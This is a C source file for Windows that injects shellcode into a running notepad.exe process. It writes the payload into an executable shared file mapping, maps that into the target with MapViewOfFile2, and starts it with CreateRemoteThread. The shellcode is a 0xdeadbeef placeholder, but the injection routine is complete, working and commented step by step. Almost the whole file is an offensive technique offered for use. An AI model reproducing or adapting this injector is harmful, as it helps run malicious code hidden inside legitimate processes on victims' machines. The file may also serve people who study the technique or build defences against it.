#include <stdio.h>
#include <Windows.h>
#include <memoryapi.h>
#include <TlHelp32.h>
#pragma comment(lib, "onecore.lib")


//-----------
// SHELLCODE
//-----------
unsigned char data[] = {
	0xde,0xad,0xbe,0xef
};

SIZE_T dataLen = sizeof(data);


//---------------------
// FIND TARGET PROCESS
//---------------------
int FindProc(LPCWSTR procName) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procName, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


//-----------
// MAIN FUNC
//-----------
int main() {
	HANDLE hProcess = NULL;
	HANDLE hFile = NULL;
	PVOID pFileMapLocal = NULL;
	PVOID pFileMapRemote = NULL;

	int pid = FindProc(L"notepad.exe");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);

  // Create file mapping handle
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, dataLen, NULL);
	if (hFile == NULL) {
		printf("[!!] CreateFileMapping failed with error: %d \n", GetLastError());
		return -1;
	}

  // Maps payload to memory using MapViewOfFile
  // Different type of memory buffer than VirtualAlloc but same idea. Empty mem buffer.
	pFileMapLocal = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, dataLen);
	if (pFileMapLocal == NULL) {
		printf("[!!] MapViewOfFile failed with error: %d \n", GetLastError());
		return -1;
	}

  // Copy payload to mapped memory
	memcpy(pFileMapLocal, data, dataLen);

  // Maps the memory buffer with now allocated payload to remote process using MapViewOfFile2
	pFileMapRemote = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pFileMapRemote == NULL) {
		printf("[!!] MapViewOfFile failed on remote process with error: %d \n", GetLastError());
		return -1;
	}

  // Execute code located within the mapped memory aka the payload.
	if (CreateRemoteThread(hProcess, NULL, NULL, pFileMapRemote, NULL, NULL, NULL) == NULL) {
		printf("[!!] CreateRemoteThread failed on remote map with error: %d \n", GetLastError());
		return -1;
	}

  // Cleanup
  // Should also perform UnmapViewOfFile but it needs to wait for the payload to finish execution otherwise it will crash.
	CloseHandle(hFile);

	return 0;
}
